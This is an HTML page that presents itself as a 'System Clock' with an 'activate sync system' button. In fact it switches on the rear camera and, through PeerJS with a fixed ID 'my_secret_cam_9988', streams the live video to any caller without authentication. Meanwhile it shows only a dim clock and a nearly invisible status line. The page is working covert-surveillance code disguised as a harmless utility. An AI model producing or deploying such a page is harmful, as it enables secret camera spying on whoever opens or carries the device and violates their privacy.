<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>系统时钟</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #004400; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #clock { font-size: 3.5rem; margin-bottom: 20px; }
        #localVideo { width: 120px; height: 90px; border: 1px solid #111; background: #050505; object-fit: cover; }
        #start-btn { padding: 20px 40px; font-size: 1.2rem; background: #002200; color: #00ff00; border: 1px solid #00ff00; border-radius: 10px; cursor: pointer; }
        #status { margin-top: 15px; font-size: 0.8rem; color: #222; }
    </style>
</head>
<body>
    <button id="start-btn" onclick="startSystem()">[ 激活同步系统 ]</button>
    <div id="clock" style="display:none;">00:00:00</div>
    <video id="localVideo" autoplay playsinline muted></video>
    <div id="status">OFFLINE</div>

    <script>
        const myID = 'my_secret_cam_9988'; 

        function startSystem() {
            const statusTag = document.getElementById('status');
            document.getElementById('start-btn').style.display = 'none';
            document.getElementById('clock').style.display = 'block';

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
            .then(stream => {
                document.getElementById('localVideo').srcObject = stream;
                
                // 国内优化版 Peer 配置
                const peer = new Peer(myID, {
                    config: { 'iceServers': [
                        { urls: 'stun:stun.anyfirewall.com:3478' },
                        { urls: 'stun:stun.stunprotocol.org:3478' },
                        { urls: 'stun:stun.l.google.com:19302' }
                    ]}
                });

                peer.on('open', () => {
                    statusTag.innerText = "DEVICE_ID: ONLINE";
                    statusTag.style.color = "#006600";
                });

                peer.on('call', (call) => {
                    call.answer(stream); 
                });

                setInterval(() => {
                    document.getElementById('clock').innerText = new Date().toLocaleTimeString();
                }, 1000);
            })
            .catch(err => { alert("摄像头开启失败，请检查权限"); });
        }
    </script>
</body>
</html>
